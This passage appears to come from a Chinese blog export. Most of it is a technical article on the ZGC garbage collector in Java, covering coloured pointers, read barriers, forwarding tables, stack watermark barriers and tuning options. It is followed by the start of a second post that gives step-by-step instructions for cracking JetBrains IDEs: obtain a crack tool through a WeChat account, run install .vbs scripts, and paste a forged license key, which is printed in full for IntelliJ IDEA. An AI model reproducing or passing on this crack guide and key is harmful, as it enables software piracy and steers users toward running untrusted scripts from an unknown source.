marked0、marked1、remapped，Finalizable。且都可以访问到内存。这样实现了指针染色的目的，且不用对指针进行裁剪，提高了效率。 着色指针的四个着色状态 Finalizable=1000 终结状态 表示对象已经要被回收了，此位与并发引用处理有关，表示这个对象只能通过finalizer才能访问。 Remapped=0100 未扫描状态 设置此位的值后，表示这个对象未指向RelocationSet中（relocation set表示需要GC的Region分区/页面集合）。 Marked1=0010 已标记状态 对象已标记状态，用于辅助GC。 Marked0=0001 已标记状态 对象已标记状态，用于辅助GC。 为什么会有两个Marked标识 这是为了防止不同GC周期之间的标记混淆，所以搞了两个Marked标识，每当新的一次GC开始时，都会交换使用的标记位。例如：第一次GC使用M0，第二次GC就会使用M1，第三次又会使用M0…，因为ZGC标记完所有分区的存活对象后，会选择分区进行回收，因此有一部分区域内的存活对象不会被转移，那么这些对象的标识就不会复位，会停留在之前的Marked标识（比如M0），如果下次GC还是使用相同M0来标记对象，那混淆了这两种对象。为了确保标记不会混淆，所以搞了两个Marked标识交替使用。 内存视图 View 内存视图是指ZGC对Java对象状态的一种描述，通过内存视图和着色指针配合，ZGC得以完成在并发转移对象的同时准确定位对象地址。 ZGC将所有对象划分为 3 种不同的视图（状态）：marked0、marked1、remapped，同一时刻只能处于其中一种视图（状态）。比如： 在没有进行垃圾回收时，视图为remapped 。 在 GC 进行标记开始，将视图从 remapped 切换到marked0/marked1 。 在 GC 进行转移阶段，又将视图从marked0/marked1 切换到remapped。 “好”指针和“坏”指针 任意线程当前访问对象的指针的着色状态和当前所处的视图一致时，则当前指针为** “好”指针** ；当前指访问对象的指针的状态和当前所处的视图不一致时，则为**“坏”指针**。 线程访问到好指针无需处理，直接通过指针访问对象地址。 触发读屏障 线程访问到坏指针时，在不同阶段会有不同的处理，处理过程在读屏障中实现。 标记阶段 访问到坏指针时，说明此对象存活且未被标记，会将指针着色状态调整为已标记的M0/M1状态。 转移阶段 访问到坏指针时，说明此对象需要被移动。线程会转移对象，然后将指针着色状态调整为未标记的Remapped状态，等待下轮GC扫描。不仅是GC线程，应用线程访问到坏指针时也会转移对象，这称为应用线程的协作转移。这样做让对象转移成为并发的过程，无需等待GC线程转移对象，应用线程自己就可以完成转移。 着色指针的**“自愈”** 通过上面的说明，发现线程访问到坏指针，在触发读屏障处理后，又恢复成好指针，且直到下轮GC之间无需再处理，线程可以直接访问对象。这一特性被称之为，ZGC的指针拥有“自愈”能力。 读屏障 Load Barrier 读屏障是一小段在特殊位置由 JIT 注入的代码，类似我们 JAVA 中常用的 AOP 技术；主要目的是处理GC并发转移后地址定位问题，对象漏标问题。 Object o = obj.fieldA; // 只有从堆中获取一个对象时，才会触发读屏障 // 读屏障伪代码 if (!(o &amp; good_bit_mask)) { if (o != null) { // 处理并注册地址 slow_path(register_for(o), address_of(obj.fieldA)); } } 处理对象漏标问题 读屏障是在读取成员变量时，统统记录下来，这种做法是保守的，但也是安全的。根据三色标记法，引发漏标问题必须要满足两个条件，其中条件二为：「已经标为黑色的对象重新与白色对象建立了引用关系」，也就是已经标记过的存活对象（黑色对象）重新和垃圾对象（白色对象）建立了引用关系，而黑色对象想要与白色对象重新建立引用的前提是：得先读取到白色对象，此时读屏障的作用就出来了，可以直接记录谁读取了当前白色对象，然后在「再次标记」重新标记一下这些黑色对象即可。 处理并发转移时对象地址定位问题 GC发生后，堆中一部分存活对象被转移，当应用线程读取对象时，可以利用读屏障通过指针上的标志来判断对象是否被转移，如果读取的对象已经被转移（线程读取到坏指针），那么则修正当前对象引用为最新地址（去转移表中查）。这样做的好处在于：下次其他线程再读取该转移对象时，可以正常访问读取到最新值（着色指针的自愈）。 转移表 Forwarding Table 转移表ForwardingTable是ZGC确保转移对象后，其他引用指针能够指向最新地址的一种技术，每个页面/分区(ZPage)中都会存在，其实就是该区中所有存活对象的转移记录，也称之为「活跃信息表」。一条线程通过引用来读取对象时，发现对象被转移后就会去转移表中查询最新的地址，并更新地址。这样在并发场景下，用户线程使用读屏障就可以通过转发表拿到新地址，用户线程可以准确访问并发转移阶段的对象了。 转移表中的数据会在发生下一次GC时清空重置，也包括会在下一次GC时触发着色指针的重映射/重定位操作。在下一次GC并发标记阶段会遍历转发表，完成所有的地址转发过程，最后在并发转移准备阶段会清空转发表。 并发标记过程 ZGC基于染色指针的并发处理过程： 在第一次GC发生前，堆中所有对象的标识为：Remapped 初始状态。 第一次GC被触发后，此时内存视图已经为开始GC的M0状态。GC线程开始标记，开始扫描，如果对象是Remapped标志，并且该对象根节点可达的，则将其改为M0标识，表示存活对象且已被标记。 如果标记过程中，扫描到的对象标识已经为M0，代表该对象已经被标记过，或者是GC开始后新分配的对象，这种情况下无需处理。 在GC开始后，用户线程新创建的对象，会直接标识为和内存视图一致的M0状态。 在标记阶段，GC线程仅标记用户线程可直接访问的对象还是不够的，实际上还需要把对象的成员变量所引用的对象都进行递归标记。 在「标记阶段」结束后，对象要么是M0存活状态，要么是未被标记的Remapped初始状态，说明这些对象不可达，即待回收状态。最终，所有被标记为M0状态的活跃对象都会被放入「活跃信息表」中。等到了「转移阶段」再对这些对象进行处理，流程如下： ZGC选择目标回收区域，开始并发转移，此时内存视图切换为Remapped状态。 GC线程遍历访问目标区域中的对象，如果对象标识为M0并且存在于活跃表中，则把该对象转移到新的分区/页面空间中，同时将其标识修正为Remapped标志。 GC线程如果扫描到的对象存在于活跃表中，但标识为Remapped，说明该对象已经转移过了，无需处理。 用户线程在「转移阶段」新创建的对象，会被标识为和内存视图一致的Remapped状态。 如果GC线程遍历到的对象不是M0状态或不在活跃表中，说明不可达，也无需转移处理。 最终，当目标区域中的所有存活对象被转移到新的分区后，ZGC统一回收原本的选择的回收区域。至此，一轮GC结束，整个堆空间会正常执行应用任务，直至触发下一轮GC。而当下一轮GC发生时，会采用M1作为GC辅助标识，而并非M0，具体原因在前面分析过了则不再阐述。 栈水印屏障 Stack Watermark Barrier JDK16后通过JEP 376提案合入JDK主线，ZGC的又一强大特性。有了这一特性的支持，从JDK 16开始。ZGC现在的暂停时间为O(1)。换句话说，它们是在恒定的时间内执行的，并且不会随着堆、活动对象集或GC Roots根集大小（或其他任何东西）的增加而增加。通过栈水印屏障特性的支持，ZGC实现了常数级暂停，亚毫秒级暂停的能力。 栈水印屏障是什么？先看一下官方博客对此的说明 在JDK 16之前，ZGC的暂停时间仍然随GC Roots根集的大小（子集）而缩放。更准确地说，ZGC仍然在停止世界阶段扫描线程栈。这意味着，如果一个Java应用有大量的线程，那么暂停时间会增加。如果这些线程有很深的调用栈，那么暂停时间会增加得更多。从JDK 16开始，线程栈的扫描是并发进行的，即在Java应用程序继续运行的同时进行。 栈水印屏障机制，可以防止Java线程在没有首先检查是否可以安全返回的情况下返回到栈帧。可以把它看作是栈帧的读屏障，如果需要的话，它将迫使Java线程在返回到栈帧之前采取某种形式的动作，使栈帧进入安全状态。每个 Java 线程都有一个或多个栈水印屏障，它告诉屏障在没有任何特殊操作的情况下可以在栈中安全地走多远。要走过一个水印，就要走一条慢路，使一个或多个栈帧进入当前安全状态，并更新水印。将所有线程栈带入安全状态的工作通常由一个或多个GC线程处理，但由于这是并发完成的，如果Java线程返回到GC线程尚未到达的栈帧中，有时就必须修复自己的几个栈帧。 有了JEP 376，ZGC现在在Stop-The-World阶段扫描的根数正好为零。 虽然说的有些绕，但还是说明了问题和解决方案。 问题就是，在JDK 16之前，ZGC的暂停时间仍然随GC Roots根集的大小增大而增大，因为ZGC要在程序完全停顿时，去扫描每个线程的所有栈帧中的回收根GCRoots。因为线程一旦运行，回收根很可能就会变化么，这很好理解。在上面的 【ZGC的标记—复制算法】，这一节里看到在初始标记阶段，应用程序是完全暂停的。 所以随着线程增多等原因，GC Roots根集增大，那自然停顿时间也要增加了呗。解决这个问题的方法，当然是和其他阶段一样，尽量使初始标记阶段对GC根集的扫描也和并发标记阶段一样，可以并发的去标记。 ZGC对这个问题怎么处理的？读屏障，没错还是读屏障，这次是对于线程栈帧使用的读屏障。 简答来说，就是通过栈水印屏障这一机制，用户线程不会在GC线程正在扫描一个线程栈时，进入这个栈。栈水印屏障的读屏障机制，会确保GC线程正在扫描线程的一个栈帧时，用户线程不会进入到这个栈帧里，直到GC线程标记完成。这一过程是完全并发的，GC线程在运行时栈的栈顶下方的栈帧里标记，用户线程在运行时栈的栈顶继续执行，栈顶的栈帧由用户线程负责标记。 这样就可以做到在标记线程栈中的GC根集同时，用户线程并发运行，无需“停止世界”。 下面具体研讨下栈水印屏障的组成和原理 栈水印是什么？ 上面说到了GC线程需要在用户线程运行时并发的去标记GC根节点，那么用户线程运行时很可能因为方法执行完毕，分支结束等原因弹出当前栈帧，回到上一个栈帧，此时GC根对象的引用关系就可能发生变化。那么问题就是如何检测这种变化？很容易想到就是退回栈时由用户线程去检测变化，重新标记GC根节点（也就是用户线程的一种协作式的标记，和用户线程遇到“坏指针”帮助转移对象一样）那么退回栈后应该扫描多少个栈帧？扫描少了，可能漏标，扫描多了会影响性能。为了降低业务线程扫描栈帧的工作量，HotSpot虚拟机中采用栈水印这一机制。 栈水印是一种在运行时栈上的标记，假设线程运行时栈向下增长，发生回栈时，可以区分回到的栈帧是否高于栈水印标记，高于水印标记的栈帧已经被标记完毕，而低于水印标记的栈帧为正在运行的用户线程栈帧。如果回到的栈已经高于栈水印，则此栈不能由 Java 线程直接使用，因为它可能因为引用关系变化而包含过时的对象引用。 读屏障 栈水印所依赖的一种读屏障。为了降低业务线程扫描栈帧的工作量，HotSpot 中采用单个栈帧扫描的方式，即在回栈时如果超过当前栈水印标记，就会进入栈水印屏障，在这个读屏障中会执行一系列操作，去处理当前帧到栈水印标记之前的栈帧，其中因为回栈可能导致引用关系变化的内容。包括修复调用方的对象指针，重新标记此节点的GC根集等。 如果此时GC线程正在标记要回栈的帧，则读屏障会限制用户线程在GC线程标记完成之前不能返回此帧。 完全并发标记过程 完全并发标记GC根集时，GC线程在运行时栈的栈顶下方的栈帧里标记，用户线程在运行时栈的栈顶继续执行。线程通过GC安全点时，将通过改变全局变量的方式在逻辑上使 Java 线程栈失效(判定为非用户线程当前帧)。每个无效的栈将被GC线程同时处理，并且继续跟踪剩余的待处理内容直到完成。 在应用线程回栈时，操作栈钩子会将一些堆栈本地地址与水印进行比较，如果回栈到栈水印之上，则需要去修复栈帧，并且向上移动水印。每次处理过程都包含对此栈帧的调用方和被调用方的处理，所以处理一般发生在栈顶的两帧上。栈水印屏障则在这两帧的后面，而且在用户线程回栈时，栈水印屏障会检查GC线程是否在处理，GC线程在处理后续的帧时，用户线程不能回栈到此帧。 Java 线程将处理继续执行所需的最小帧数。并发 GC 线程将处理剩余的帧，确保最终扫描完所有线程栈和其他线程GC根集。 栈水印屏障 Stack Watermark Barrier的实现非常复杂，即便是ZGC官方博客也没有对其的详细讲解，有兴趣的可以具体去查看源码。 ZGC 其他特性 支持非统一内存访问架构 UMA架构：UMA即Uniform Memory Access Architecture（统一内存访问），UMA也就是一般正常电脑的常用架构，一块内存多颗CPU，所有CPU在处理时都去访问一块内存，所以必然就会出现竞争（争夺内存主线访问权），而操作系统为了避免竞争过程中出现安全性问题，注定着也会伴随锁概念存在，有锁在的场景定然就会影响效率。同时CPU访问内存都需要通过总线和北桥，因此当CPU核数越来越多时，渐渐的总线和北桥就成为瓶颈，从而导致使用UMA/SMP架构机器CPU核数越多，竞争会越大，性能会越低。 NUMA架构：NUMA即Non Uniform Memory Access Architecture（非统一内存访问），NUMA架构下，每颗CPU都会对应有一块内存，具体内存取决于处理器的内存位置，一般与CPU对应的内存都是在主板上离该CPU最近的，CPU会优先访问这块内存，每颗CPU各自访问距离自己最近的内存，效率自然而然就提高了。 NUMA架构允许多台机器共同组成一个服务供给外部使用，NUMA技术可以使众多服务器像单一系统那样运转，该架构在中大型系统上一直非常盛行，也是高性能的解决方案，尤其在系统延迟方面表现都很优秀，因此，实际上堆空间也可以由多台机器的内存组成。 通过NUMA非统一内存访问架构，机器得以纵向扩展，硬件性能堆叠，提供TB级内存单元。 ZGC是能自动感知处理器是否是NUMA架构，并可以充分利用NUMA架构特性的一款垃圾收集器。 ZGC在NUMA架构的处理器上,为活跃线程分配对象时，会就近分配到此线程所在处理器的优先访问内存上。 就地重定位 ZGC使用的是标记—整理算法，也就是优化的标记-复制算法。此算法有个缺陷，就是要复制或者说移动对象，那么内存中必须存在一定的连续空闲空间用于移动对象，如果堆已满，即所有堆区域都已在使用中，那么我们无处可移动对象。 在 JDK 16 之前，ZGC 通过保留堆解决了这个问题。此保留堆是一组被搁置的堆区域，并且对于来自用户线程的正常分配内存不可用。一般保留堆占整个Java堆的15%左右。使用保留堆的方案仍然存在一些缺陷，首先就是堆内存的浪费，其次是保留堆不一定能完全支持整理过程完成，此时可能导致ZGC失败，发生长时间暂停或堆栈溢出异常。 其他收集器，比如G1，可以通过就地压缩堆来处理整理算法的需要空闲空间的问题，这种方法的主要优点是它不需要空闲内存来保证整理堆空间以释放内存。换句话说，它将压缩一个完整的堆，而不需要某种堆空间保留。 ZGC中将类似的能力称之为就地重定位In-Place Relocation 就地重定位 无连续空闲空间，就地重定位，活动对象按顺序移动的空间0 非就地重定位 有连续空闲空间 3，无需就地重定位，按整理算法直接移动活动对象到3号空间 但是，就地重定位通常会带来更多的性能开销。例如，就地重定位必须顺序的移动对象，否则可能会覆盖尚未移动的对象。此时GC 线程不能进行并行处理移动对象，并且还会影响 Java 线程操作需要GC整理的对象，在这些对象重新定位时会产生一些操作限制。 当有空闲堆区域可用时，不就地重新定位通常性能更好， 而就地重定位可以保证重新定位过程成功完成，即使没有空堆区域可用。总之，这两种方法都有优点。 从 JDK 16 开始，ZGC 现在同时的使用这两种方法来实现两全其美的效果。这使得即便不使用保留堆 ，仍然可以在普通情况下保持良好的转移对象的性能，并保证即便在无空闲空间的危险情况下，仍然可以实现对象整理。 默认情况下，只要存在可用于将对象移动到的空闲堆区域，ZGC 就不会就地重新定位。否则，ZGC将启用就地重定位。一旦重新有空闲堆区域可用，ZGC将再次切换回不使用地重新定位。 对比Azul Zing C4 GC C4收集器由Azul的无暂停垃圾收集器PauseLessGC发展而来，相比PauseLess收集器，C4收集器最大的改进就是支持了分代回收模型。 这有点像ZGC的发展历程，目前(截止JDK18)的ZGC都是不支持分代的，而支持分代的ZGC正在开发中。 有观点认为ZGC就是重写的，纯软件实现的Azul PauseLessGC。目前正在追逐接近C4GC的目标。 C4全名 Continuously Concurrent Compacting Collector，连续并发压缩回收器。 ZGC的完全并发能力，对应C4的 Continuously Concurrent 连续并发能力 ZGC的标记—整理算法，就地重定位能力，对应C4的 Compacting 压缩能力 现在也就差分代回收未实现了。 没有分代回收，ZGC在极高对象分配速率时，仍然不及C4GC。 总结 ZGC 优点 低停顿，高吞吐量，ZGC收集过程中额外耗费的内存小。 低停顿，几乎所有过程都是并发的，只有短暂的STW。 占用额外的内存小。G1通过写屏障维护记忆集，才能处理跨代指针，得以实现增量回收。记忆集占用大量内存，写屏障对正常程序造成额外负担。而ZGC没有写屏障，卡表之类的。（但这主要得益于ZGC目前没有实现分代回收，要是分代回收实现之后，还会不会这样不好说了） 吞吐量方面，在ZGC的‘弱项’吞吐量方面，因为和用户线程并发，还是有影响的。但是以低延迟为首要目标的ZGC已经达到了以高吞吐量为目标Parallel Scavenge收集器的99%,直接超越了G1。 支持NUMA架构 现在多CPU插槽的服务器都是NUMA架构，比如两颗CPU插槽(24核)，64G内存的服务器，那其中一颗CPU上的12个核，访问从属于它的32G本地内存，要比访问另外32G远端内存要快得多。 在支持NUMA架构的多核处理器下，ZGC优先在线程当前所处的处理器的本地内存上分配对象，以保证内存高效访问。 ZGC采用并发的标记-整理算法。没有内存碎片。 ZGC 缺点 承受的对象分配速率不会太高，因为浮动垃圾。 ZGC的停顿时间是在10ms以下，但是ZGC的执行时间还是远远大于这个时间的。 假如ZGC全过程需要执行10分钟，在这个期间由于对象分配速率很高，将创建大量的新对象，这些对象很难进入当次GC，会被直接判定为存活对象，而本轮GC回收期间可能新分配的对象会有大部分对象都成为了“垃圾”，这些只能等到下次GC才能回收的对象就是浮动垃圾。可能造成回收到的内存空间小于期间并发产生的浮动垃圾所占的空间。 这个问题通过分代回收能有很大优化，但是目前ZGC还不支持分代。 ZGC目前不支持分代回收 ZGC目前没有实现分代回收，每次都需要进行全堆扫描，导致一些“朝生夕死”的对象没能及时的被回收。所以就不存在Young GC、Old GC，所有的GC行为都是Full GC。 ZGC在OpenJDK上只有在JDK17以后才正式可用 Oracle HotSpotJDK,Adopt OpenJDK等常用JDK在低版本均无生产可用的ZGC，虽然OpenJDK中的ZGC在Java15中正式生产可用，但是Java17才是Java11之后的下一个长期稳定版。可以通过选择AliJDK，TencentJDK等试用规避此问题。 ZGC使用 低版本可用 ZGC在Java15正式生产就绪，而下一个长期支持版的Java为Java 17。这对于一些还在使用低版本JDK的开发者来说是个难题，毕竟升级JDK并不是一蹴而就的容易事。 那么有没有办法在Java11即可使用ZGC呢？也有的 国内的话，阿里云开源并维护的Ali DragonWell JDK，腾讯开源并维护的 Tencent Kona JDK,均提供了Java11版本下可用的ZGC。并且移植了大量高版本OpenJDK的特性和ZGC问题的修复，如果要在Java11下使用ZGC，选择以上两家的JDK是最后的选择。 并不建议在Java11版本的OpenJDK上使用ZGC，因为存在很多在高版本才修复的问题。 ZGC参数说明 Java 17下启用ZGC指令 -XX:+UseZGC 注意不需要使用G1收集器时的关闭CMS收集器指令,因为CMS收集器已经在Java 9中被删除了。 通用GC选项 ZGC选项 ZGC诊断选项 -XX:MinHeapSize, -Xms -XX:ZAllocationSpikeTolerance -XX:ZStatisticsInterval -XX:InitialHeapSize, -Xms -XX:ZCollectionInterval -XX:ZVerifyForwarding -XX:MaxHeapSize, -Xmx -XX:ZFragmentationLimit -XX:ZVerifyMarking -XX:SoftMaxHeapSize -XX:ZMarkStackSpaceLimit -XX:ZVerifyObjects -XX:ConcGCThreads -XX:ZProactive -XX:ZVerifyRoots -XX:ParallelGCThreads -XX:ZUncommit -XX:ZVerifyViews -XX:UseDynamicNumberOfGCThreads -XX:ZUncommitDelay -XX:UseLargePages -XX:UseTransparentHugePages -XX:UseNUMA -XX:SoftRefLRUPolicyMSPerMB -XX:AllocateHeapAt ZGC的垃圾回收什么情况下会被触发？ ZGC中目前会有四种机制导致GC被触发： ①定时触发，默认为不使用，可通过ZCollectionInterval参数配置。 ②预热触发，最多三次，在堆内存达到10%、20%、30%时触发，主要时统计GC时间，为其他GC机制使用。 ③分配速率，基于正态分布统计，计算内存99.9%可能的最大分配速率，以及此速率下内存将要耗尽的时间点，在耗尽之前触发GC「耗尽时间 - 一次GC最大持续时间 - 一次GC检测周期时间」。 ④主动触发，默认开启，可通过ZProactive参数配置，距上次GC堆内存增长10%，或超过5分钟时，对比「距上次GC的间隔时间」和「49*一次GC的最大持续时间」，超过则触发。 ZGC调优 ZGC 相当智能，我们需要调整的参数很少，由于 ZGC 已经自动将垃圾回收时间控制在 10ms 左右，我们主要关心的是垃圾回收的次数和避免并发回收失败导致的长停顿。 ZGC的核心特点是并发，GC过程中一直有新的对象产生。如何保证在GC完成之前，新产生的对象不会将堆占满，是ZGC参数调优的第一大目标。因为在ZGC中，当垃圾来不及回收将堆占满时，会导致正在运行的线程停顿，持续时间可能长达秒级之久。 ZGC有多种GC触发机制 阻塞内存分配请求触发： 当垃圾来不及回收，垃圾将堆占满时，会导致部分线程阻塞。日志中关键字是“Allocation Stall”。 基于分配速率的自适应算法： 最主要的 GC 触发方式，其算法原理可简单描述为” ZGC 根据近期的对象分配速率以及 GC 时间，计算出当内存占用达到什么阈值时触发下一次 GC ”。日志中关键字是“Allocation Rate”。 基于固定时间间隔： 通过ZCollectionInterval控制，适合应对突增流量场景。流量平稳变化时，自适应算法可能在堆使用率达到95%以上才触发GC。流量突增时，自适应算法触发的时机可能会过晚，导致部分线程阻塞。我们通过调整此参数解决流量突增场景的问题，比如定时活动、秒杀等场景。日志中关键字是“Timer”。 主动触发规则： 类似于固定间隔规则，但时间间隔不固定，是 ZGC 自行算出来的时机。日志中关键字是“Proactive”。其中，最主要使用的是 Allacation Stall GC 和 Allocation Rate GC。我们的调优思路为尽量不出现 Allocation Stall GC , 然后 Allocation Rate GC 尽量少。为了做到不出现 Allocation Stall GC ，我们需要做到垃圾尽量提前回收，不要让堆被占满，所以我们需要在堆内存占满前进行 Allocation Rate GC 。为了 Allocation Rate GC 尽量少，我们需要提高堆的利用率，尽量在堆占用 80% 以上进行 Allocation Rate GC 。基于此，Oracle 官方 ZGC 调优指南只建议我们调整两个参数： 预热规则： 服务刚启动时出现，一般不需要关注。日志中关键字是“Warmup”。 外部触发： 代码中显式调用System.gc()触发。 日志中关键字是“System.gc()”。 元数据分配触发： 元数据区不足时导致，一般不需要关注。 日志中关键字是“Metadata GC Threshold”。 参考 JVM成神路之GC分区篇：G1、ZGC、ShenandoahGC高性能收集器深入剖析 ZGC在去哪儿机票运价系统实践 # 关于我 Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！ 非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2023/04/27/%E3%80%90JVM%E3%80%91%E6%9E%81%E8%87%B4%E4%BD%8E%E5%BB%B6%E8%BF%9F%E6%94%B6%E9%9B%86%E5%99%A8ZGC%E6%8E%A2%E7%B4%A2%E2%80%94%E2%80%94%E4%BA%9A%E6%AF%AB%E7%A7%92%E7%BA%A7%EF%BC%8C%E5%B8%B8%E6%95%B0%E7%BA%A7%E6%9A%82%E5%81%9CO(1)%E5%8E%9F%E7%90%86/"},{"title":"JetBrains全系列激活码","text":"# JetBrains 全系列激活码 注：不同的软件，需要不同的激活码，千万别复制错了 # 本文讲的是支持 2022.2.2 最新版本的 RubyMine 破解、RubyMine 激活码、RubyMine 安装、RubyMine 永久激活码的最新永久激活教程，本文有 mac 和 windows 系统的 RubyMine 安装教程。 # 1. 下载你需要的 IDE 工具 # 2. 下载破解工具 (微信公众号搜索 InterviewCoder) 或扫码关注公众号回复关键词《破解》即可获取 # 3. 下载好后解压并打开，选择 scripts # 4. 先执行 unistall-current-user.vbs, 直接双击打开，此步骤是为了防止之前有过激活信息，确保当前环境变量下没有激活工具的变量信息，可先执行卸载脚本在再进行后面的激活操作，避免激活失败。 出现弹框 done 说明成功 然后再执行 install-current-user.vbs, 直接双击打开即可 这里需要等待 10 秒左右才会出现第二个 done 弹框，才是成功 # 5. 然后再输入对应的激活码即可！！！！ # IDEA 专用 1XIZQAN09CR-eyJsaWNlbnNlSWQiOiJYSVpRQU4wOUNSIiwibGljZW5zZWVOYW1lIjoia2lkZHkgaW5zZWFtcyIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IlBEQiIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFNJIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQUEMiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBDV01QIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQUkIiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBQUyIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiSUkiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJQR08iLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBTVyIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6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 # PyCharm 专用 